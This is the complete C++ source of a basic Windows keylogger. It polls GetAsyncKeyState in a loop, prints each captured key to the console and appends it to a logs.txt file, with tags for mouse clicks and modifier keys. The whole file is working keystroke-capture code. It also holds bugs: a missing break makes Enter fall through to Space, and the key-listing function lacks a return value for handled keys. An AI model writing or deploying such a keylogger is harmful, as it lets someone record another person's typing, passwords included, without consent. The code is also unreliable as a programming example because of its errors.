#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteLog(LPCSTR text) {
	ofstream outfile; //creates object for writing
	outfile.open("logs.txt", ofstream::app); //opens file
	outfile << text; //writes text to file
	outfile.close(); //closes file
}

bool KeyIsListed(int iGetKey) {
	switch (iGetKey)
	{
	case VK_LBUTTON: 
		cout << " *LeftM* " << endl; //left mouse click
		WriteLog(" *LeftM* ");
		break;
	case VK_RBUTTON: 
		cout << " *RightM* " << endl; //right mouse click
		WriteLog(" *RightM* ");
		break;
	case VK_CONTROL: 
		cout << " *Ctrl* " << endl; //ctrl pressed
		WriteLog(" *Ctrl* ");
		break;
	case VK_SHIFT:   
		cout << " *Shift* " << endl; //shift pressed
		WriteLog(" *Shift* ");
		break;
	case VK_RETURN: 
		cout << "\n"; //enter pressed
		WriteLog("\n");
	case VK_SPACE:
		cout << " "; //enter pressed
		WriteLog(" ");
		break;
	default: return FALSE;
	}
	
}

int main()
{
	char key; //char for storing our keylogged key
	while (TRUE)
	{
		Sleep(10); //wait 10 ms
		for (key = 8; key <= 190; key++) //loop
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE)
				{
					cout << key; //print key to console
					ofstream outfile; //same as WriteLog()
                    outfile.open("logs.txt", ofstream::app);
					outfile << key;
					outfile.close();
  		     	}
				else {
				}
			}
		}
	}	
	return EXIT_SUCCESS;
}
